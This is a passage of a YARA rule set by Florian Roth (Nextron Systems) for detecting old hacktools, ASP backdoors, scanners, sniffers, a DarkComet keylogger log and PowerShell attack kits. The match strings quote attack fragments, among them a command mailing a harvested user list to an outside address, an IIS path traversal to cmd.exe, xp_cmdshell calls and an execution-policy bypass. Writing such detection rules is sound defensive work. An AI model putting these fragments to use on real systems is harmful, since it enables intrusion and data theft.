      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
      id = "5fe349db-c0fc-5a49-97ee-3142f4e0e4c1"
   strings:
      $s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
      $s8 = "cmd.bat" fullword ascii
      $s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
      $s11 = "%s Execute Succussifully." fullword ascii
      $s12 = "winsta0" fullword ascii
      $s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii
   condition:
      4 of them
}

rule sig_238_nbtdump {
   meta:
      description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
      id = "fe490f72-a07d-57c2-b9bb-d791fab10ec6"
   strings:
      $s0 = "Creation of results file - \"%s\" failed." fullword ascii
      $s1 = "c:\\>nbtdump remote-machine" fullword ascii
      $s7 = "Cerberus NBTDUMP" fullword ascii
      $s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
      $s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
      $s19 = "%s's password is %s</H3>" fullword wide
      $s20 = "%s's password is blank</H3>" fullword wide
   condition:
      5 of them
}

rule sig_238_Glass2k {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Glass2k.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "b05455a1ecc6bc7fc8ddef312a670f2013704f1a"
      id = "7a2ad37a-6b55-5710-b07d-7c289cdbb04e"
   strings:
      $s0 = "Portions Copyright (c) 1997-1999 Lee Hasiuk" fullword ascii
      $s1 = "C:\\Program Files\\Microsoft Visual Studio\\VB98" fullword ascii
      $s3 = "WINNT\\System32\\stdole2.tlb" fullword ascii
      $s4 = "Glass2k.exe" fullword wide
      $s7 = "NeoLite Executable File Compressor" fullword ascii
   condition:
      all of them
}

rule SplitJoin_V1_3_3_rar_Folder_3 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "21409117b536664a913dcd159d6f4d8758f43435"
      id = "4ffd7501-339c-52b7-8661-2c3ca57dfa1f"
   strings:
      $s2 = "ie686@sohu.com" fullword ascii
      $s3 = "splitjoin.exe" fullword ascii
      $s7 = "SplitJoin" fullword ascii
   condition:
      all of them
}

rule aspbackdoor_EDIT {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "12196cf62931cde7b6cb979c07bb5cc6a7535cbb"
      id = "cdcec370-97af-51c0-b81a-35a788f16ef4"
   strings:
      $s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
      $s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
      $s3 = "response.write \"<a href='index.asp'>" fullword ascii
      $s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
      $s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
      $s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
      $s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
   condition:
      5 of them
}

rule aspbackdoor_entice {
   meta:
      description = "Disclosed hacktool set (old stuff) - file entice.asp"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
      id = "68c61920-9c3c-5bfe-976c-346b258bb406"
   strings:
      $s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
      $s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
      $s4 = "conndb.Execute(sqllanguage)" fullword ascii
      $s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
      $s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
   condition:
      all of them
}

rule FPipe2_0 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file FPipe2.0.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "891609db7a6787575641154e7aab7757e74d837b"
      id = "7e104cf6-69d2-590e-8999-4f0d448719f2"
   strings:
      $s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
      $s1 = "Unable to resolve hostname \"%s\"" fullword ascii
      $s2 = " -s    - outbound connection source port number" fullword ascii
      $s3 = "source port for that outbound connection being set to 53 also." fullword ascii
      $s4 = "http://www.foundstone.com" fullword ascii
      $s19 = "FPipe" fullword ascii
   condition:
      all of them
}

rule InstGina {
   meta:
      description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "5317fbc39508708534246ef4241e78da41a4f31c"
      id = "ccbda689-e61a-501d-a8ed-62e3c1c20289"
   strings:
      $s0 = "To Open Registry" fullword ascii
      $s4 = "I love Candy very much!!" ascii
      $s5 = "GinaDLL" fullword ascii
   condition:
      all of them
}

rule ArtTray_zip_Folder_ArtTray {
   meta:
      description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
      id = "d29909a4-8663-54c7-8f0e-68b15def869f"
   strings:
      $s0 = "http://www.brigsoft.com" fullword wide
      $s2 = "ArtTrayHookDll.dll" fullword ascii
      $s3 = "ArtTray Version 1.0 " fullword wide
      $s16 = "TRM_HOOKCALLBACK" fullword ascii
   condition:
      all of them
}

rule sig_238_findoor {
   meta:
      description = "Disclosed hacktool set (old stuff) - file findoor.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce"
      id = "61215a76-8c29-505d-bfef-a5f13fec476c"
   strings:
      $s0 = "(non-Win32 .EXE or error in .EXE image)." fullword ascii
      $s8 = "PASS hacker@hacker.com" fullword ascii
      $s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii
      $s10 = "MAIL FROM:hacker@hacker.com" fullword ascii
      $s11 = "http://isno.yeah.net" fullword ascii
   condition:
      4 of them
}

rule aspbackdoor_ipclear {
   meta:
      description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "9f8fdfde4b729516330eaeb9141fb2a7ff7d0098"
      id = "71ebecea-721f-5c5d-9997-6a57f070d91c"
   strings:
      $s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
      $s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
      $s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
      $s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
      $s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
   condition:
      all of them
}

rule WinEggDropShellFinal_zip_Folder_InjectT {
   meta:
      description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
      id = "16f04551-050f-5a07-a35b-a3a7dbba6803"
   strings:
      $s0 = "Packed by exe32pack" ascii
      $s1 = "2TInject.Dll" fullword ascii
      $s2 = "Windows Services" fullword ascii
      $s3 = "Findrst6" fullword ascii
      $s4 = "Press Any Key To Continue......" fullword ascii
   condition:
      all of them
}

rule gina_zip_Folder_gina {
   meta:
      description = "Disclosed hacktool set (old stuff) - file gina.dll"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
      id = "7ebc7218-9c7b-5595-ae7b-f316fc99d1f6"
   strings:
      $s0 = "NEWGINA.dll" fullword ascii
      $s1 = "LOADER ERROR" fullword ascii
      $s3 = "WlxActivateUserShell" fullword ascii
      $s6 = "WlxWkstaLockedSAS" fullword ascii
      $s13 = "WlxIsLockOk" fullword ascii
      $s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
      $s16 = "WlxShutdown" fullword ascii
      $s17 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
   condition:
      all of them
}

rule superscan3_0 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file superscan3.0.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
      id = "d22aa3ae-4c62-5007-896d-7c473f0421a6"
   strings:
      $s0 = "\\scanner.ini" ascii
      $s1 = "\\scanner.exe" ascii
      $s2 = "\\scanner.lst" ascii
      $s4 = "\\hensss.lst" ascii
      $s5 = "STUB32.EXE" fullword wide
      $s6 = "STUB.EXE" fullword wide
      $s8 = "\\ws2check.exe" ascii
      $s9 = "\\trojans.lst" ascii
      $s10 = "1996 InstallShield Software Corporation" fullword wide
   condition:
      all of them
}

rule sig_238_xsniff {
   meta:
      description = "Disclosed hacktool set (old stuff) - file xsniff.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "d61d7329ac74f66245a92c4505a327c85875c577"
      id = "1e61a732-8691-5f84-beb0-c9f7e6d46538"
   strings:
      $s2 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
      $s3 = "%s - simple sniffer for win2000" fullword ascii
      $s4 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
      $s5 = "HOST: %s USER: %s, PASS: %s" fullword ascii
      $s7 = "http://www.xfocus.org" fullword ascii
      $s9 = "  -pass        : Filter username/password" fullword ascii
      $s18 = "  -udp         : Output udp packets" fullword ascii
      $s19 = "Code by glacier <glacier@xfocus.org>" fullword ascii
      $s20 = "  -tcp         : Output tcp packets" fullword ascii
   condition:
      6 of them
}

rule sig_238_fscan {
   meta:
      description = "Disclosed hacktool set (old stuff) - file fscan.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
      id = "7af4d38a-bc88-57ba-b602-4e01d3d95015"
   strings:
      $s0 = "FScan v1.12 - Command line port scanner." fullword ascii
      $s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
      $s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
      $s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
      $s12 = "Failed to open the IP list file \"%s\"" fullword ascii
      $s13 = "http://www.foundstone.com" fullword ascii
      $s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
      $s18 = "Bind port number out of range. Using system default." fullword ascii
      $s19 = "fscan.exe" fullword wide
   condition:
      4 of them
}

rule _iissample_nesscan_twwwscan {
   meta:
      description = "Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      super_rule = 1
      hash0 = "7f20962bbc6890bf48ee81de85d7d76a8464b862"
      hash1 = "c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b"
      hash2 = "548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f"
      id = "a710ca8e-54dc-5a98-b173-c87b22af745f"
   strings:
      $s0 = "Connecting HTTP Port - Result: " fullword
      $s1 = "No space for command line argument vector" fullword
      $s3 = "Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp" fullword
      $s5 = "No space for copy of command line" fullword
      $s7 = "-  Windows NT,2000 Patch Method  - " fullword
      $s8 = "scanf : floating point formats not linked" fullword
      $s12 = "hrdir_b.c: LoadLibrary != mmdll borlndmm failed" fullword
      $s13 = "!\"what?\"" fullword
      $s14 = "%s Port %d Closed" fullword
      $s16 = "printf : floating point formats not linked" fullword
      $s17 = "xxtype.cpp" fullword
   condition:
      all of them
}

rule _FsHttp_FsPop_FsSniffer {
   meta:
      description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      super_rule = 1
      hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
      hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
      hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"
      id = "5ca543af-2589-52b0-83f9-ad25ba76b633"
   strings:
      $s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
      $s1 = "-ERR Get SMS Users ID Failed" fullword
      $s2 = "Control Time Out 90 Secs, Connection Closed" fullword
      $s3 = "-ERR Post SMS Failed" fullword
      $s4 = "Current.hlt" fullword
      $s6 = "Histroy.hlt" fullword
      $s7 = "-ERR Send SMS Failed" fullword
      $s12 = "-ERR Change Password <New Password>" fullword
      $s17 = "+OK Send SMS Succussifully" fullword
      $s18 = "+OK Set New Password: [%s]" fullword
      $s19 = "CHANGE PASSWORD" fullword
   condition:
      all of them
}

rule Ammyy_Admin_AA_v3 {
   meta:
      description = "Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/gkAg2E"
      date = "2014/12/22"
      score = 55
      hash1 = "b130611c92788337c4f6bb9e9454ff06eb409166"
      hash2 = "07539abb2623fe24b9a05e240f675fa2d15268cb"
      id = "bb140cb7-9f56-5acb-883e-080dfd3f60d5"
   strings:
      $x1 = "S:\\Ammyy\\sources\\target\\TrService.cpp" fullword ascii
      $x2 = "S:\\Ammyy\\sources\\target\\TrDesktopCopyRect.cpp" fullword ascii
      $x3 = "Global\\Ammyy.Target.IncomePort" fullword ascii
      $x4 = "S:\\Ammyy\\sources\\target\\TrFmFileSys.cpp" fullword ascii
      $x5 = "Please enter password for accessing remote computer" fullword ascii

      $s1 = "CreateProcess1()#3 %d error=%d" fullword ascii
      $s2 = "CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name." fullword ascii
      $s3 = "ERROR: CreateProcessAsUser() error=%d, session=%d" fullword ascii
      $s4 = "ERROR: FindProcessByName('explorer.exe')" fullword ascii
   condition:
      2 of ($x*) or all of ($s*)
}

/* Other dumper and custom hack tools */

rule LinuxHacktool_eyes_scanssh {
   meta:
      description = "Linux hack tools - file scanssh"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "not set"
      date = "2015/01/19"
      hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
      id = "9546d0d8-42af-5b4c-ac93-195d14bfbb5b"
   strings:
      $s0 = "Connection closed by remote host" fullword ascii
      $s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
      $s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
      $s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
      $s5 = "Server closed connection" fullword ascii
      $s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
      $s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
      $s9 = "Remote host closed connection" fullword ascii
      $s10 = "%s: line %d: bad command `%s'" fullword ascii
      $s13 = "verifying that server is a known host : file %s not found" fullword ascii
      $s14 = "%s: line %d: expected service, found `%s'" fullword ascii
      $s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
      $s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii
   condition:
      all of them
}

rule LinuxHacktool_eyes_pscan2 {
   meta:
      description = "Linux hack tools - file pscan2"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "not set"
      date = "2015/01/19"
      hash = "56b476cba702a4423a2d805a412cae8ef4330905"
      id = "02d96766-6696-5410-ad48-bd8cb642ac51"
   strings:
      $s0 = "# pscan completed in %u seconds. (found %d ips)" fullword ascii
      $s1 = "Usage: %s <b-block> <port> [c-block]" fullword ascii
      $s3 = "%s.%d.* (total: %d) (%.1f%% done)" fullword ascii
      $s8 = "Invalid IP." fullword ascii
      $s9 = "# scanning: " fullword ascii
      $s10 = "Unable to allocate socket." fullword ascii
   condition:
      2 of them
}

rule LinuxHacktool_eyes_a {
   meta:
      description = "Linux hack tools - file a"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "not set"
      date = "2015/01/19"
      hash = "458ada1e37b90569b0b36afebba5ade337ea8695"
      id = "2b4f52d4-b438-5040-89c5-aab1df15200e"
   strings:
      $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
      $s1 = "mv scan.log bios.txt" fullword ascii
      $s2 = "rm -rf bios.txt" fullword ascii
      $s3 = "echo -e \"# by Eyes.\"" fullword ascii
      $s4 = "././pscan2 $1 22" fullword ascii
      $s10 = "echo \"#cautam...\"" fullword ascii
   condition:
      2 of them
}

rule LinuxHacktool_eyes_mass {
   meta:
      description = "Linux hack tools - file mass"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "not set"
      date = "2015/01/19"
      hash = "2054cb427daaca9e267b252307dad03830475f15"
      id = "5da0c474-2dc8-5580-bf5c-d3f464225e4c"
   strings:
      $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
      $s1 = "echo -e \"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\n\\r" ascii
      $s3 = "killall -9 pscan2" fullword ascii
      $s5 = "echo \"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\"" fullword ascii
      $s6 = "echo -e \"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\"" fullword ascii
   condition:
      1 of them
}

rule LinuxHacktool_eyes_pscan2_2 {
   meta:
      description = "Linux hack tools - file pscan2.c"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "not set"
      date = "2015/01/19"
      hash = "eb024dfb441471af7520215807c34d105efa5fd8"
      id = "3950b235-70bc-5afd-add5-38c50055b28b"
   strings:
      $s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
      $s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
      $s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
      $s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
      $s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii
   condition:
      2 of them
}

rule CN_Portscan : APT
{
    meta:
        description = "CN Port Scanner"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        date = "2013-11-29"
        confidential = false
      score = 70
        id = "fb52a89a-2270-5170-9874-9278a0177454"
    strings:
      $s2 = "TCP 12.12.12.12"
    condition:
        uint16(0) == 0x5A4D and $s2
}

rule WMI_vbs : APT
{
    meta:
        description = "WMI Tool - APT"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        date = "2013-11-29"
        confidential = false
      score = 70
        id = "b367306a-38d8-5f4d-8f09-2bf025831f0a"
    strings:
      $s3 = "WScript.Echo \"   $$\\      $$\\ $$\\      $$\\ $$$$$$\\ $$$$$$$$\\ $$\\   $$\\ $$$$$$$$\\  $$$$$$"
    condition:
        all of them
}

rule CN_Toolset__XScanLib_XScanLib_XScanLib {
   meta:
      description = "Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://qiannao.com/ls/905300366/33834c0c/"
      date = "2015/03/30"
      score = 70
      super_rule = 1
      hash0 = "af419603ac28257134e39683419966ab3d600ed2"
      hash1 = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
      hash2 = "135f6a28e958c8f6a275d8677cfa7cb502c8a822"
      id = "c32415f4-044c-50ef-9c4c-b9327cbcef69"
   strings:
      $s1 = "Plug-in thread causes an exception, failed to alert user." fullword
      $s2 = "PlugGetUdpPort" fullword
      $s3 = "XScanLib.dll" fullword
      $s4 = "PlugGetTcpPort" fullword
      $s11 = "PlugGetVulnNum" fullword
   condition:
      all of them
}

rule CN_Toolset_NTscan_PipeCmd {
   meta:
      description = "Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://qiannao.com/ls/905300366/33834c0c/"
      date = "2015/03/30"
      score = 70
      hash = "a931d65de66e1468fe2362f7f2e0ee546f225c4e"
      id = "056ee42d-23f4-5b03-b240-392bc92b90b0"
   strings:
      $s2 = "Please Use NTCmd.exe Run This Program." fullword ascii
      $s3 = "PipeCmd.exe" fullword wide
      $s4 = "\\\\.\\pipe\\%s%s%d" fullword ascii
      $s5 = "%s\\pipe\\%s%s%d" fullword ascii
      $s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
      $s7 = "%s\\ADMIN$\\System32\\%s" fullword ascii
      $s9 = "PipeCmdSrv.exe" fullword ascii
      $s10 = "This is a service executable! Couldn't start directly." fullword ascii
      $s13 = "\\\\.\\pipe\\PipeCmd_communicaton" fullword ascii
      $s14 = "PIPECMDSRV" fullword wide
      $s15 = "PipeCmd Service" fullword ascii
   condition:
      4 of them
}

rule CN_Toolset_LScanPortss_2 {
   meta:
      description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://qiannao.com/ls/905300366/33834c0c/"
      date = "2015/03/30"
      score = 70
      hash = "4631ec57756466072d83d49fbc14105e230631a0"
      id = "0a796585-5fc8-5b55-acfc-3fe87308b681"
   strings:
      $s1 = "LScanPort.EXE" fullword wide
      $s3 = "www.honker8.com" fullword wide
      $s4 = "DefaultPort.lst" fullword ascii
      $s5 = "Scan over.Used %dms!" fullword ascii
      $s6 = "www.hf110.com" fullword wide
      $s15 = "LScanPort Microsoft " fullword wide
      $s18 = "L-ScanPort2.0 CooFly" fullword wide
   condition:
      4 of them
}

rule CN_Toolset_sig_1433_135_sqlr {
   meta:
      description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://qiannao.com/ls/905300366/33834c0c/"
      date = "2015/03/30"
      score = 70
      hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
      id = "74038975-ef06-53d6-bdcc-02706408b596"
   strings:
      $s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
      $s11 = ";DATABASE=master" fullword ascii
      $s12 = "xp_cmdshell '" fullword ascii
      $s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
   condition:
      all of them
}

rule DarkComet_Keylogger_File
{
   meta:
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      description = "Looks like a keylogger file created by DarkComet Malware"
      date = "25.07.14"
      score = 50
      id = "65058450-3ae3-5b85-bcc5-8bc1fab14614"
   strings:
      $entry = /\n:: [A-Z]/
      $timestamp = /\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\)/
   condition:
      uint16(0) == 0x3A3A and #entry > 10 and #timestamp > 10
}

rule VSSown_VBS {
   meta:
      description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "2015-10-01"
      score = 75
      id = "ffbb5faf-3522-50dc-a568-503074ac0636"
   strings:
      $s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
      $s1 = "Select * From Win32_ShadowCopy" ascii
      $s2 = "cmd /C mklink /D " ascii
      $s3 = "ClientAccessible" ascii
      $s4 = "WScript.Shell" ascii
      $s5 = "Win32_Process" ascii
   condition:
      all of them
}

rule Netview_Hacktool {
   meta:
      description = "Network domain enumeration tool - often used by attackers - file Nv.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/mubix/netview"
      date = "2016-03-07"
      score = 60
      hash = "52cec98839c3b7d9608c865cfebc904b4feae0bada058c2e8cdbd561cfa1420a"
      id = "087e2fd7-726e-5c6b-ba99-e20dd3337d6a"
   strings:
      $s1 = "[+] %ws - Target user found - %s\\%s" fullword wide
      $s2 = "[*] -g used without group specified - using \"Domain Admins\"" fullword ascii
      $s3 = "[*] -i used without interval specified - ignoring" fullword ascii
      $s4 = "[+] %ws - Session - %s from %s - Active: %d - Idle: %d" fullword wide
      $s5 = "[+] %ws - Backup Domain Controller" fullword wide
      $s6 = "[-] %ls - Share - Error: %ld" fullword wide
      $s7 = "[-] %ls - Session - Error: %ld" fullword wide
      $s8 = "[+] %s - OS Version - %d.%d" fullword ascii
      $s9 = "Enumerating Logged-on Users" fullword ascii
      $s10 = ": Specifies a domain to pull a list of hosts from" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and 2 of them ) or 3 of them
}

rule Netview_Hacktool_Output {
   meta:
      description = "Network domain enumeration tool output - often used by attackers - file filename.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/mubix/netview"
      date = "2016-03-07"
      score = 60
      id = "259db870-6293-5a55-b56a-f981c060c18f"
   strings:
      $s1 = "[*] Using interval:" fullword
      $s2 = "[*] Using jitter:" fullword
      $s3 = "[+] Number of hosts:" fullword
   condition:
      2 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-03-09
   Identifier: PSattack
*/

/* Rule Set ----------------------------------------------------------------- */

rule PSAttack_EXE {
   meta:
      description = "PSAttack - Powershell attack tool - file PSAttack.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/gdssecurity/PSAttack/releases/"
      date = "2016-03-09"
      modified = "2023-01-06"
      score = 100
      hash = "ad05d75640c850ee7eeee26422ba4f157be10a4e2d6dc6eaa19497d64cf23715"
      id = "87f7956a-f607-5e14-a940-5080499cf682"
   strings:
      $x1 = "\\Release\\PSAttack.pdb"

      $s1 = "set-executionpolicy bypass -Scope process -Force" fullword wide
      $s2 = "PSAttack.Modules." ascii
      $s3 = "PSAttack.PSAttackProcessing" fullword ascii
      $s4 = "PSAttack.Modules.key.txt" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and ( $x1 or 2 of ($s*) ) ) or 3 of them
}

rule Powershell_Attack_Scripts {
   meta:
      description = "Powershell Attack Scripts"
